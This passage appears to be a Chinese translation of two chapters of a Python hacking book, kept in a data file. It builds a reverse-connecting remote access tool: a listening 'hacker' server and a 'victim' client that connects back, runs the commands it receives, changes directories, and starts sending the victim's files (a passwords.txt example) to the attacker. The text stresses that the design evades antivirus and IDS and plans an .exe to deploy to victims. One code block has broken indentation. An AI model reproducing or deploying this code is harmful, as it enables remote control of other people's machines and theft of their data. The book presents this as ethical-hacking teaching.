+  \ PDF 或 JPEG 文件中。对受害者来说，它看起来像一个普通文件，但当受害者点击文件打开时，后台会执行一个脚本，该脚本会向攻击者发起连接。一旦与攻击者的连接建立，攻击者就可以轻松控制受害者的机器并在受害者机器上远程执行命令。现在我们已经了解了正向\
+  \ Shell 和反向 Shell，让我们继续讨论 Python 中的套接字。\n\n## Python 中的 Socket 编程\n\n在学习恶意软件开发之前，有必要学习\
+  \ Python 中的网络编程以及如何创建网络应用程序。学习网络编程的第一步是学习我们所说的 *套接字*。套接字为创建基于网络的应用程序提供了一种基本机制，而我们的恶意软件本质上就是一个网络应用程序。让我们先从理解套接字开始。\n\
+  \n## 套接字\n\n在我们进入套接字编程之前，让我们先了解网络套接字是什么以及它如何用于开发基于网络的应用程序。正如我们在前几章中所学，网络栈的最上层是应用层。这些是用户在日常生活中交互的应用程序。现在，问题是，这些用不同编程语言开发的应用程序如何在网络上通信？答案在于使用套接字。套接字在此定义：https://docs.oracle.com/javase/tutorial/networking/sockets/definition.html。\n\
+  \n套接字是网络上运行的两个程序之间双向通信链路的一个端点。套接字绑定到一个端口号，以便 TCP 层可以识别数据目的地要发送到的应用程序。\n\n套接字通常用于客户端-服务器通信，其中一个节点是发起连接的客户端，而另一个节点是响应该连接的服务器。在连接的每一端，每个进程，例如网络发起程序或网络响应程序，都会使用一个套接字。套接字通常由\
+  \ IP 地址与端口号连接起来标识。在典型场景中，服务器通常在某个端口上监听来自客户端的传入连接请求。一旦客户端请求到达，服务器接受请求并与客户端建立套接字连接。\n\
+  \n实现特定服务的服务器，例如 **HTTP、FTP** 和 **telnet**，监听流行的众所周知的端口，例如 80、21 和 23。1-1024 端口被视为众所周知的端口，不应在实现自己的程序时使用，因为它们已被保留。让我们尝试了解套接字如何在\
+  \ Python 中工作，并在下一节中学习如何利用这一点来创建我们的恶意软件程序。\n\n## 在 Python 中创建套接字\n\n要在 Python 中创建套接字，我们可以利用\
+  \ `socket` 库。该库是 Python 标准包的一部分，因此我们无需安装任何东西。\n\n该模块可以通过简单地输入以下代码导入：\n\n```\nimport\
+  \ socket\n```\n\n让我们来看看该模块的 **应用程序编程接口（API）**。API 是代码库的软件接口，让你以某种抽象级别访问代码的功能。\n\n\
+  ## socket.socket() API\n\n要创建套接字对象，我们可以使用名为 `socket()` 的以下函数。让我们看看此方法 的参数。要查看 VS\
+  \ Code 中函数可用的参数，你可以简单地写出函数名，然后使用 VS Code Intelli Sense 技术（帮助你编写代码并提供建议），你可以看到需要哪些参数。要访问此菜单，如果你将光标放在函数名上，将会出现一个小弹出窗口，指示该方法所需\
+  \ 的参数。如果你想查看此方法的详细实现，可以右键单击 `socket` 函数的名称并选择 **转到定义**。这将打开一个定义此方法的文件。请注意不要更改此处\
+  \ 的任何内容。如果你没有使用 VS Code，你可以阅读 Python socket 模块的相关文档：https://docs.python.org/3/library/socket.html。该方法的实现看起来像这样：\n\
+  \n## socket.connect()\n\n正如我们所见 socket.accept() 会阻塞执行直到客户端连接，那么问题就来了，客户端如何连接？这就是\
+  \ socket.connect() 发揮作用的地方。此方法会向服务器发起连接，如果服务器正在等待传入连接，通信将随之进行。当调用 socket.connect()\
+  \ 时，服务器中的 socket.accept() 会被解除阻塞，程序执行继续进行。不要担心，如果你现在对服务器中调用哪些函数、客户端中调用哪些函数感到非常困惑。你将在我们构建示例时对这一点有清晰的认识。\n\
+  \n## socket.send()\n\n一旦服务器和客户端程序之间建立连接，程序中最重要的一部分就来了，即通过这些连接发送数据。这就是大部分用户定义逻辑所在的地方。socket.send()\
+  \ 方法用于通过网络发送字节。请注意，此函数的输入是字节，因此你希望通过此连接发送的任何数据都应以字节形式存在。将适当的数据编码为字节并在接收端解码是用户的责任。\n\
+  \n## Socket.recv()\n\n此方法顾名思义，用于在用户发送数据后接收字节。请注意，对发送或接收方法的每次调用都应妥善处理。例如，如果服务器正在发送数据，客户端应准备好接收这些数据，反之亦然。此方法的输入是你一次想要接收的字节数。这是程序创建的缓冲区，用于临时存储数据，一旦到达一定数量的字节，就可以读取它们，缓冲区就可以准备好进行下一个周期。\n\
+  \n## socket.close()\n\n一旦你完成了对程序想要做的一切，就必须关闭套接字，以便端口可以供其他程序使用。请注意，即使你没有正确关闭套接字，一旦你的程序退出或计算机重新启动，你的操作系统也会在一段时间后释放它。然而，手动在程序内部关闭这些套接字始终是一个好主意。如果程序退出且套接字未正确关闭，任何传入请求可能会被阻止，或者操作系统可能拒绝为下一个程序使用此套接字，因为它可能认为端口仍在使用中。\n\
+  \n\n\n\n\n## 整合起来\n\n到目前为止，我们已经学习了 socket API 的不同方法，但为了清楚地了解每个函数如何以及在何处使用，我将在此处对所有内容进行总结。我们将同时运行两个程序。一个将是监听传入连接的服务器，另一个将是尝试建立连接的客户端。让我们看一下下面的图表，了解\
+  \ socket API 中各部分是如何配合的：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_135_0.png)\n\
+  \n图 6.2 – Python 中客户端和服务器的 socket 使用情况\n\n该图表显示了两个并发运行的独立程序，即客户端和服务器。你可能在想这个客户端和服务器与我们的黑客目的有什么关系？嗯，我们将采用类似的方法来开发我们的恶意软件。我们将编写两个程序。一个程序将在黑客机器上运行，我们称之为服务器/黑客程序，另一个将在客户端运行；我们将称之为受害者程序。受害者程序将尝试与黑客程序连接。这样，由于连接是由受害者机器发起的，反病毒软件或\
+  \ IDS 将不会阻止它。在本节中，我们学习了 Python 中 socket 编程的工作原理。我们没有详细说明如何创建这些程序。在下一节中，我们将利用此 socket\
+  \ API 创建恶意软件的受害者部分和黑客部分。\n\n## 创建恶意软件\n\n现在我们已经看到了恶意软件程序的大致轮廓，让我们开始编写黑客和受害者程序。\n\
+  \n## 黑客服务器\n\n在本节中，我们将为黑客服务器编写一个程序，该程序将不断监听来自受害者机器发往黑客的传入连接。让我们进入 Kali 机器并创建一个名为\
+  \ hacker server 的新项目。此外，像之前章节一样创建一个新的虚拟环境。本节中我们不需要任何外部库，但使用虚拟环境来跟踪程序中的依赖项始终是一个好主意。此外，创建一个名为\
+  \ server.py 的新文件。\n\n我们的 Kali 机器的 IP 地址是 192.168.74.128，受害者 Windows 机器的是 192.168.74.129。接下来，我们需要选择要监听传入连接的端口。你可以选择大于\
+  \ 1024 且小于 65355 的任意端口。然而，我们将使用端口号 8008。这将是服务器绑定的端口，如果客户端想要与服务器连接，则需要使用此端口。让我们导入\
+  \ socket 模块并创建一个 socket 对象。看一下以下代码：\n\n```\nimport socket\n\nif __name__ == \"__main__\"\
+  :\n    hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n```\n\n\
+  这里，第一行我们只是从 Python 标准库导入 socket 模块。接下来，我们正在创建一个 socket 对象。两个参数是 socket.AF_INET 和\
+  \ socket.SOCK_STREAM。让我们看看它们的含义。还记得我们谈论过 IPv4 和 IPv6 地址吗？这正是 socket.AF_INET 的含义。我们使用的是\
+  \ IPv4，用 socket.AF_INET 表示。如果你想使用 IPv6（你可能不会），你可以选择 socket.AF_INET6。接下来，我们需要定义想要使用的网络层协议。这里，我们可以选择\
+  \ TCP 或 UDP。在我们的示例中，我们想要一个可靠的连接，因此我们将选择 TCP。socket.SOCK_STREAM 表示我们正在创建一个 TCP socket。如果你想创建一个\
+  \ UDP socket（同样，大多数情况下你可能不会），你可以使用 socket.SOCK_DGRAM。\n\n接下来，我们将此服务器绑定到 Kali 的 IP\
+  \ 地址和端口 8008：\n\n```\nIP = \"192.168.74.128\"\nPort = 8008\n```\n\n```\nsocket_address\
+  \ = (IP, Port)\nhacker_socket.bind(socket_address)\n```\n\n请注意，你必须以元组形式提供 IP 地址和端口给\
+  \ socket.bind() 方法。\n\n接下来，我们需要使用以下命令在指定的 socket 上监听传入连接：\n\n```\nhacker_socket.listen(5)\n\
+  ```\n\n现在我们的程序配置几乎完成，我们可以开始监听传入的连接请求：\n\n```\nhacker_socket.listen(5)\nprint(\"\
+  listening for incoming connection requests\")\nhacker_socket, client_address = hacker_socket.accept()\n\
+  ```\n\n程序的执行将在此处暂停。一旦客户端连接，此方法将返回两个参数。第一个是 hacker_socket，我们可以用它来发送和接收数据，第二个是受害者的地址。这将帮助程序知道哪个客户端已连接。\n\
+  \n一旦连接被接受，我们就可以使用此 socket 通过网络发送消息。如前所述，accept 函数是阻塞的，这意味着执行在此处暂停，直到有人连接。为了演示这一点，让我们运行程序。你将看到以下输出：\n\
+  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_137_0.png)\n\n图 6.3 - 等待传入连接\n\n你会看到程序不会在此步骤之后继续。你可以按\
+  \ Ctrl + C 退出程序。现在，让我们尝试从黑客向受害者发送一条简单消息。目前，我们将发送一个简单字符串，但在后面的章节中，我们将发送更高级的数据，例如文件：\n\
+  \n```\nmessage = \"Message from hacker\"\nmessage_bytes = message.encode()\nhacker_socket.send(message_bytes)\n\
+  print(\"Message sent from hacker\")\n```\n\nmessage.encode() 方法将消息字符串转换为字节，因为 socket.send()\
+  \ 方法只接受字节。\n\n最后，我们将通过调用 close() 方法关闭此 socket。\n\n黑客程序的完整代码如下所示：\n\n```\nimport\
+  \ socket\n\nif __name__ == \"__main__\":\n    hacker_socket = socket.socket(socket.AF_INET,\
+  \ socket.SOCK_STREAM)\n    IP = \"192.168.74.128\"\n    Port = 8008\n    socket_address\
+  \ = (IP, Port)\n    hacker_socket.bind(socket_address)\n    hacker_socket.listen(5)\n\
+  \    print(\"listening for incoming connection requests\")\n    hacker_socket, client_address\
+  \ = hacker_socket.accept()\n    message = \"Message from hacker\"\n    message_bytes\
+  \ = message.encode()\n    hacker_socket.send(message_bytes)\n    print(\"Message\
+  \ sent\")\n    hacker_socket.close()\n```\n\n我们的黑客程序现已完成。接下来，我们将转向受害者程序，该程序将与黑客建立连接。\n\
+  \n## 受害者的客户端\n\n进入 Windows 10 机器并为受害者创建一个新项目。前几步将与黑客程序类似。看一下以下代码：\n\n```\nimport\
+  \ socket\n\nif __name__ == \"__main__\":\n    victim_socket = socket.socket(socket.AF_INET,\
+  \ socket.SOCK_STREAM)\n    hacker_IP = \"192.168.74.128\"\n```\n\n```\nhacker_port\
+  \ = 8008\n```\n\n```\nhacker_address = (hacker_IP, hacker_port)\n```\n\n由于我们想要连接到黑客，我们将提供黑客的\
+  \ IP 和黑客正在监听的相应端口。\n\n接下来，我们将为 hacker_address 创建一个元组。\n\n下一步是使用受害者的 socket 与黑客 connect()：\n\
+  \n```\nvictim_socket.connect(hacker_address)\n```\n\n一旦调用此方法，如果服务器正在监听，我们将建立成功的连接，否则我们会看到错误消息。如果你现在运行程序，你会看到连接被拒绝的消息：\n\
+  \n![](img/d31345bbfd15f63be2920f0de5fa30dc_139_0.png)\n\n图 6.4 – 连接失败\n\n这是因为，如果没有服务器监听某个端口，默认情况下所有传入流量都会被阻止。还记得在我们的黑客程序中，我们正在发送消息吗？我们需要在此处处理该消息，否则会出现错误。我们可以使用\
+  \ recv 方法来接收消息：\n\n```\ndata = victim_socket.recv(1024)\n```\n\n1024 是 socket 一次可以读取的字节数。来自黑客的超过此数量的任何数据都将被截断。我们可以使用循环来接收更多数据。目前，这个数字足够了。\n\
+  \n最后，由于我们以字节形式接收数据，我们需要将它们解码为字符串以便打印，并在以后在程序中使用它们（如果我们想要）：\n\n```\nprint(data.decode())\n\
+  ```\n\n```\nvictim_socket.close()\n```\n\n\n\n我们可以使用 close() 方法关闭套接字。完整的程序如下：\n\n\
+  ```\nimport socket\n\nif __name__ == \"__main__\":\n    victim_socket = socket.socket(socket.AF_INET,\
+  \ socket.SOCK_STREAM)\n\n    hacker_IP = \"192.168.74.128\"\n    hacker_port = 8008\n\
+  \    hacker_address = (hacker_IP, hacker_port)\n    victim_socket.connect(hacker_address)\n\
+  \    data = victim_socket.recv(1024)\n    print(data.decode())\n    victim_socket.close()\n\
+  ```\n\n现在我们的黑客和受害者程序已以最简单的形式完成。黑客正在监听传入连接，而受害者尝试与黑客程序连接。一旦连接建立，黑客就会向受害者发送一条消息。受害者接收消息并简单地打印出来。双方随后关闭各自的连接。到目前为止我们所学的是通用的套接字编程。一旦我们了解如何在网络中的两台设备之间创建连接，我们就可以采用这些程序来创建恶意程序，从而允许黑客在受害者计算机上执行恶意活动。\n\
+  \n让我们把这一切联系起来。首先运行黑客程序，然后运行受害者程序。这次，连接将被正确建立，并且在黑客机器上，你将看到以下输出：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_140_0.png)\n\
+  \n同样，受害者将接收到消息并在屏幕上显示：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_140_1.png)\n\n\
+  我们已经完成了拼图的一部分，即从受害者机器创建到黑客机器的成功连接，并在受害者机器上接收到黑客发送的一条小消息。这可能看起来不是一个大任务，但这是一个非常强大的工具。利用它，你基本上可以从黑客处获取命令。设计受害者程序在机器上运行这些命令并将结果发送回黑客。在下一节中，我们将学习如何从黑客机器向受害者机器发送命令并将结果发送回黑客。\n\
+  \n## 在受害者机器上远程运行命令\n\n我们已经在第 3 章《侦察和信息收集》中，在《创建 Python 脚本》部分，看到如何使用 Python 在计算机上运行命令。我们将在此知识的基础上构建一个恶意软件，该恶意软件将接收命令并在受害者机器上执行它们。我们之前的程序只是向受害者发送一条消息然后退出。这次，我们将修改程序使其做更多的事情。\n\
+  \n在 Kali 机器上打开一个新项目以在受害者机器上执行命令并创建一个新文件。让我们首先建立连接：\n\n```\nimport socket\n\nif __name__\
+  \ == \"__main__\":\n    hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\
+  \    IP = \"192.168.74.128\"\n    Port = 8008\n    socket_address = (IP, Port)\n\
+  \    hacker_socket.bind(socket_address)\n    hacker_socket.listen(5)\n    print(\"\
+  listening for incoming connection requests\")\n    hacker_socket, client_address\
+  \ = hacker_socket.accept()\n```\n\n下一步涉及获取用户输入，即我们希望在受害者机器上运行的命令。获取输入后，我们必须将其转换为字节并通过连接发送到受害者程序：\n\
+  \n```\ncommand = input(\"Enter the command \")\nhacker_socket.send(command.encode())\n\
+  ```\n\n一旦命令发送，受害者端程序将负责执行它并返回结果。在这里，在黑客程序中，我们只需接收受害者返回的内容并将其打印为结果：\n\n```\ncommand_result\
+  \ = hacker_socket.recv(1048)\nprint(command_result.decode())\n```\n\n接下来，我们将把这放入一个循环中并添加退出条件：\n\
+  \n```\nwhile True:\n    command = input(\"Enter the command \")\n    hacker_socket.send(command.encode())\n\
+  \    if command == \"stop\":\n        break\n    command_result = hacker_socket.recv(1048)\n\
+  \    print(command_result.decode())\n```\n\nif 语句确保我们可以在需要时安全地退出此循环，以免陷入无限循环。此外，为了确保在执行期间遇到任何错误时正确关闭套接字，我们将添加\
+  \ try-catch 块进行异常处理。用于执行命令的完整黑客程序如下所示：\n\n```\nimport socket\n\nif __name__ == \"\
+  __main__\":\n    hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\
+  \    IP = \"192.168.74.128\"\n    Port = 8008\n    socket_address = (IP, Port)\n\
+  \    hacker_socket.bind(socket_address)\n    hacker_socket.listen(5)\n    print(\"\
+  listening for incoming connection requests\")\n    hacker_socket, client_address\
+  \ = hacker_socket.accept()\n    print(\"connection established with \", client_address)\n\
+  \    try:\n        while True:\n            command = input(\"Enter the command\
+  \ \")\n            hacker_socket.send(command.encode())\n```\n\n```\nif command\
+  \ == \"stop\":\n    break\n    command_result = hacker_socket.recv(1048)\n    print(command_result.decode())\n\
+  except Exception:\n    print(\"Exception occured\")\n    hacker_socket.close()\n\
+  ```\n\n在受害者端，我们将接收黑客发送的命令并使用 subprocess 模块执行命令，最后将结果发送回黑客。这部分将在 Windows 10 机器上编码。让我们在\
+  \ Windows 机器上创建一个新项目并尝试遵循与创建与黑客程序连接相同的步骤：\n\n```\nimport socket\nif __name__ ==\
+  \ \"__main__\":\n    victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\
+  \    hacker_IP = \"192.168.74.128\"\n    hacker_port = 8008\n    hacker_address\
+  \ = (hacker_IP, hacker_port)\n    victim_socket.connect(hacker_address)\n```\n\n\
+  正如我们在黑客程序中所看到的，我们有一个 while 循环来连续发送命令，我们将在此处采用类似的方法：\n\n```\ndata = victim_socket.recv(1024)\n\
+  \    hacker_command = data.decode()\n```\n\n我们将在此处添加与黑客程序中相同的退出条件：\n\n```\nif hacker_command\
+  \ == \"stop\":\n    break\n```\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_145_0.png)\n\
+  \n图 6.7 – 黑客在受害者上执行命令\n\n在这里，你可以看到黑客向受害者发送 ipconfig 命令。受害者程序读取命令，在受害者上执行它，并将结果发送回黑客。程序有一些小问题，我们现在将讨论。首先，受害者程序只尝试连接一次黑客，如果黑客没有监听，程序将抛出错误并退出。这并不理想，因为我们希望在需要时连接到受害者。为此，我们将把\
+  \ connect() 方法放在循环内，以便它可以尝试持续与黑客建立连接，并且当黑客在线时，连接会立即建立。查看此处受害者程序的代码：https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example09-victim-malware/victim.py。\n\
+  \n让我们现在看看在此程序中做出的更改。首先，有一个外部 while 循环。此循环的目的是不断尝试与黑客建立连接，如果发生错误，则等待 5 秒后再尝试重新连接。一旦在循环内部建立连接，就有一个内部循环确保黑客可以向受害者发送多个命令。通过使用\
+  \ stop 命令，黑客可以退出此 while 循环。最后，如果你想关闭程序，还有一个键盘中断异常。按 Ctrl + C 退出程序。这样，此程序不会无限运行。\n\
+  \n所以现在我们已经解决了第一个问题。现在我们需要只运行一次受害者程序，它将不断尝试与黑客连接，并且当黑客可用时，它将连接。我们的程序还有另一个小问题。当黑客程序要求输入命令时，如果我们只是按\
+  \ Enter，它会引起问题，因为 Enter 不是有效命令。我们也需要处理它。为此，我们可以简单地包含一个检查，以确保黑客不会输入空命令。为此，输入以下命令：\n\
+  \n```\nif command == \"\":\n    continue\n```\n\n我们将在黑客程序和受害者程序中都放置此检查。\n\n最后，如果你仔细观察，我们只能发送和接收小于\
+  \ 1,024 字节的数据，因为在我们的接收函数中定义了这一点。任何超过此限制的数据将被截断。要更详细地查看，请转到 Windows 机器并运行任何结果超过 1,024\
+  \ 字节的命令。例如，让我们看看 systeminfo 命令。此命令输出系统信息，并且输出相对较大：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_146_0.png)\n\
+  \n图 6.8 – systeminfo 结果\n\n\n\n\n\n现在，使用你的黑客程序运行相同的命令。你的输出将如下所示：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_147_0.png)\n\
+  \n图 6.9 – 被截断的命令结果\n\n正如你所见，我们只能接收 1,024 字节。这不是我们想要的。为了获取完整的结果，我们需要做一些修改。在受害者程序上，我们将在\
+  \ command_result 的末尾附加一个特殊标识符。使用此标识符，我们将在黑客程序中继续读取数据，直到到达该标识符。这将作为黑客程序的标记，知道我们已完成接收所有数据并且可以停止。\n\
+  \n标识符字符串如下：\n\n```\nIDENTIFIER = \"<END_OF_COMMAND_RESULT>\"\n```\n\n要将此标识符添加到 command_result，我们将首先将结果从字节解码为字符串，然后在末尾附加标识符，最后再次将字符串转换为字节，如下所示：\n\
+  \n```\ncommand_result = output.stdout\ncommand_result = command_result.decode(\"\
+  utf-8\") + IDENTIFIER\ncommand_result = command_result.encode(\"utf-8\")\n```\n\n\
+  这次，我们将不再使用 send() 方法，而是使用 sendall() 方法。\n\n在黑客端，我们将定义完全相同的标识符，以便我们可以匹配它。现在，我们将不再只是接收\
+  \ 1,024 字节，而是添加一个 while 循环，该循环将持续接收数据并将其存储在数组中，直到找到标识符，然后我们将删除标识符并存储剩余的结果。\n\n请看以下接收代码：\n\
+  \n```\nfull_command_result = b\"\"\nwhile True:\n    chunk = hacker_socket.recv(1048)\n\
+  \    if chunk.endswith(IDENTIFIER.encode()):\n        chunk = chunk[:-len(IDENTIFIER)]\n\
+  \        full_command_result += chunk\n        break\n    full_command_result +=chunk\n\
+  print(full_command_result.decode())\n```\n\n我们定义了一个 full_command_result 变量来保存完整的结果。然后我们编写一个循环来持续读取缓冲区，直到到达标识符。一旦到达标识符，我们将从结果中删除标识符，将剩余的字节添加到\
+  \ full_command_result 中，跳出循环，最后将其解码以打印。黑客的完整程序如下所示：https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example08-hacker-malware/hacker.py。\n\
+  \n同样，受害者的完整程序如下所示：https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example09-victim-malware/victim.py。\n\
+  \n现在我们已经开发了一个黑客程序，它将在 Windows 受害者机器上执行命令并将完整结果返回给黑客。该程序将完美运行。然而，由于我们仅处理命令结果的输入和输出，因此更改目录的命令在此处将无法正常工作。接下来，我们将专注于制作一个程序，以便我们也可以导航目录。如果你去你的\
+  \ Windows 机器并打开命令提示符，你可以使用 cd 命令来导航目录，我们在这里也会使用类似的方法。因此，当用户输入更改目录命令时，我们将根据给定的命令在受害者机器上移动到不同的目录。在本节中，我们学习了如何从黑客程序运行命令并将结果返回给黑客。在下一节中，我们将学习如何通过从黑客程序发出命令来在受害者计算机上导航目录。\n\
+  \n## 导航目录\n\n我们将使用一个新的模块来更改目录，称为 os 模块。该模块包含在 Python 的标准库中，因此你无需安装它。只需在程序中通过编写以下命令导入该模块即可：\n\
+  \n```\nimport os\n```\n\n我们需要做的第一件事是检测用户在黑客程序中输入 cd 命令时。在字符串 command 上调用 startswith()\
+  \ 方法可以实现这一点。我们将检测命令，将命令发送到受害者程序，然后跳过循环的其余部分，如下所示：\n\n```\nif command.startswith(\"\
+  cd\"):\n    hacker_socket.send(command.encode())\n    continue\n```\n\n我们程序的第一部分现在已完成。接下来，我们需要在受害者程序上接收此命令，对其进行解码，检查命令类型，例如导航目录，然后找到我们想要移动到的路径。假设如果我们想在目录中后退（在层次结构中向上一步），我们输入以下命令：\n\
+  \n```\ncd ..\n```\n\ncd 是命令的名称，.. 是我们想要移动到的路径。因此，在受害者程序上，我们将首先使用相同的检查条件来查看 hacker_command\
+  \ 是否以 cd 开头。如果是，我们将剥离命令以检索我们想要进入的路径。最后，我们将使用 os.chdir() 方法导航到输入的目录（如果存在）：\n\n```\n\
+  if hacker_command.startswith(\"cd\"):\n    path2move = hacker_command.strip(\"cd\
+  \ \")\n    if os.path.exists(path2move):\n        os.chdir(path2move)\n    else:\n\
+  \        print(\"can't change directory to \", path2move)\n    continue\n```\n\n\
+  在 Windows 中，你可以通过在 shell 中输入 pwd（当前工作目录）命令来查看当前目录。现在让我们运行黑客和受害者程序，看看我们如何导航目录：\n\n\
+  ![](img/d31345bbfd15f63be2920f0de5fa30dc_150_0.png)\n\n图 6.10 – 更改目录\n\n正如前面的屏幕截图所示，我们首先使用\
+  \ cd .. 命令在文件夹中向上导航并移动到用户文件夹。然后，我们通过 cd Desktop 命令导航到桌面文件夹。这样，我们就可以在文件系统中向上或向下移动。黑客程序的完整代码如下：https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example08-hacker-malware/hacker.py。\n\
+  \n同样，受害者程序的完整代码如下所示：https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example09-victim-malware/victim.py。\n\
+  \n前面的程序将允许黑客执行命令并将受害者 PC 的基本控制权交给黑客。黑客可以使用它作为模板为程序构建更高级的功能。你可能会想，我们到目前为止编写的所有代码都是\
+  \ Python 脚本的形式，为了部署它并进行成功的黑客攻击，受害者 PC 必须安装 Python 并且脚本必须手动运行，这似乎不是一个好主意。别担心。在第 8\
+  \ 章《后利用》中，我们将研究如何将我们的 Python 代码打包成一个包含所有依赖项的单个可执行文件。这样，我们就不必担心受害者是否安装了 Python。我们将从脚本创建\
+  \ .exe 文件并将其部署到受害者。有关更多信息，请参阅下一章。\n\n## 总结\n\n在本章中，我们首先学习了套接字编程，然后学习了如何使用套接字创建网络应用程序。我们的网络应用程序包括黑客和受害者程序，这有助于我们从基于\
+  \ Linux 的黑客程序发送 Windows 系统命令，在 Windows 上执行它们，并将结果返回给黑客。我们还学习了如何导航文件流。我们的 RAT 基础版本已完成。尽管其功能有限，但它为我们提供了创建更高级的恶意软件程序的基础知识的坚实理解。在下一章中，我们将为我们的\
+  \ RAT 添加更多功能，例如传输文件。下一章见！\n"
+- "# 7\n高级恶意软件\n\n在上一章中，我们学习了如何创建一个非常简单的恶意软件，它执行由黑客发送的 *Windows* 命令并返回这些命令的结果。该程序在仅执行命令的能力方面非常有限。理想情况下，对于\
+  \ **远程访问工具**，我们希望恶意软件程序具有比这更高级的功能。本章将给你一个关于你可以在恶意软件程序中编写的更高级功能的基本概念。我们将在本章中介绍以下主题：\n\
+  \n- 文件传输\n- 窃取 Wi-Fi 凭据\n- 截屏\n\n## 构建一个 keylogger 文件传输\n\n我们已经在第 6 章《恶意软件开发》中开发的程序中学习了如何发送和接收非常基本的数据。在本章中，我们将尝试从一台\
+  \ PC 向另一台 PC 发送和接收文件，首先从受害者 PC 向黑客 PC，然后从黑客 PC 向受害者 PC。这将使我们能够访问受害者 PC 上存在的任何敏感文件。例如，假设受害者已将其密码存储在其\
+  \ PC 上存在的文件中（这是一个非常糟糕的主意；切勿将密码以纯文本文件形式存储在你的 PC 上）；那么我们可以简单地读取文件的内容并将其发送给黑客。让我们看看这是如何工作的。\n\
+  \n\n\n\n\n## 将受害者文件下载到黑客\n\n在这里，我们将修改我们在 *第 6 章，恶意软件开发* 中开发的程序，在其中我们运行 Windows 命令以添加文件传输功能（参见\
+  \ *创建恶意软件* 部分）。首先，我们将添加下载功能，以将受害者 PC 上的任何文件发送到黑客 PC，并在之后反向发送。要通过网络发送文件，我们需要执行某些步骤。这些步骤如下列出：\n\
+  \n- 1. 检查文件是否存在。如果不存在，则抛出错误。\n- 2. 如果文件存在，将文件内容读入你的程序。\n- 3. 读取内容后，在数据末尾添加一个特殊标记以表示文件传输完成。\n\
+  - 4. 通过网络发送数据字节。\n- 5. 在接收端，接收字节直到匹配标记。\n- 6. 一旦识别出标记，将标记从接收到的字节中移除。\n- 7. 将剩余的字节写入你的\
+  \ PC 的文件系统。\n- 8. 关闭连接。\n\n如果您不立即理解这些步骤，请不要担心。我们将逐一讲解这些步骤。您可以将此功能添加到我们在 *第 6 章，恶意软件开发*\
+  \ 中已开发的程序中。为了简化操作，使用我们在 *第 6 章，恶意软件开发* 的 *创建恶意软件* 部分中开发的黑客和受害者程序。在 Kali 和 Windows\
+  \ PC 上为黑客和服务器创建一个新项目，这次将其命名为 *advanced_server* 和 *advanced_victim*。将之前章节的代码复制到各自的项目中，以便您拥有可构建的代码库。\n\
+  \n让我们首先定义如何将文件从受害者发送到黑客。假设受害者 PC 上存在一个文件，其中存储了受害者的密码。这用作示例。理论上，您可以从受害者 PC 下载您想要的任何文件。\n\
+  \n假设文件名是 passwords.txt。让我们以图形形式查看策略，以了解这在实践中如何工作：\n\n![](img/d31345bbfd15f63be2920f0de5fa30dc_155_0.png)\n\
+  \n图 7.1 – 向黑客发送文件\n\n首先，我们需要将受害者的文件名从黑客发送到受害者。我们已经在学习 *第 6 章，恶意软件开发* 中的套接字时了解了如何通过网络发送文本数据，因此此过程相当直接。在黑客程序中，我们将设计以下策略来发送我们需要从受害者下载的文件名。我们的命令将如下所示，`download\
+  \ passwords.txt`，如果我们想下载名为 `passwords.txt` 的文件。因此，在黑客程序中，我们将检查黑客命令是否以 download 开头以创建此条件的\
+  \ case。让我们看一下以下代码。在我们检查不同条件的 main loop 中，我们将插入以下检查：\n\n```\nelif command.startswith(\"\
+  download\"):\n    hacker_socket.send(command.encode())\n    exist = hacker_socket.recv(1024)\n\
+  ```\n\n第一行检查黑客的命令是否是要从受害者下载文件。如果是，我们将命令发送给受害者，受害者将回复文件是否存在。根据回复，可能采取进一步行动。如果文件存在，我们将处理下载文件的\
+  \ case，否则我们将安全地退出程序。现在，让我们在黑客程序上暂停一下，转到受害者程序。在受害者端，我们需要添加一个类似的 case 来检查命令是否为 download。如果是，我们将从接收到的消息中检索文件名并检查文件是否存在。转到受害者程序并在\
+  \ main loop 中编写以下检查：\n\n```\nelif hacker_command.startswith(\"download\"):\n   \
+  \ file_to_download = hacker_command.strip(\"download \")\n    if os.path.exists(file_to_download):\n\
+  \        exists = \"yes\"\n        victim_socket.send(exists.encode())\n    else:\n\
+  \        exists = \"no\"\n        victim_socket.send(exists.encode())\n        continue\n\
+  ```\n\n在这里，我们接收命令并检查命令类型。一旦我们接收到包含 download 字符串的命令，我们就可以从命令中剥离 download 部分以检索我们感兴趣的实际文件名。在前一段代码的第三行中，我们检查文件是否存在。如果存在，我们发送回\
+  \ yes，否则发送回 no。请记住，在黑客程序中，我们正在等待接收此回复到 exists 变量。请注意，我们尚未发送任何文件数据。我们只是创建外部循环以正确处理数据的发送和接收。文件的读取部分将在前一段代码中的第一个\
+  \ if 语句中处理。现在我们需要读取文件。\n\n让我们看一下以下代码，该代码从受害者机器读取文件然后将其发送回黑客：\n\n```\nwith open(file_to_download,\
+  \ \"rb\") as file:\n    chunk = file.read(CHUNK_SIZE)\n    while len(chunk) > 0:\n\
+  \        victim_socket.send(chunk)\n        chunk = file.read(CHUNK_SIZE)\n    \
+  \    # This will run till the end of file.\n\n## once the file is complete, we need\
+  \ to send the marker.\nvictim_socket.send(eof_identifier.encode())\nprint(\"File\
+  \ sent successfully\")\n```\n\n让我们分解我们刚刚看到的代码。file 行是打开并以二进制格式读取文件的命令。即使它是一个文本文件，如果您想通过网络传输文件，最好以二进制格式读取文件，因为在实际情况下文件类型可能是任何类型。然后我们读取一\
+  \ chunk 字节，我们在文件顶部定义 CHUNK_SIZE = 2048。在读取第一个 chunk 后，我们检查文件是否还有更多字节。如果有，我们使用 while\
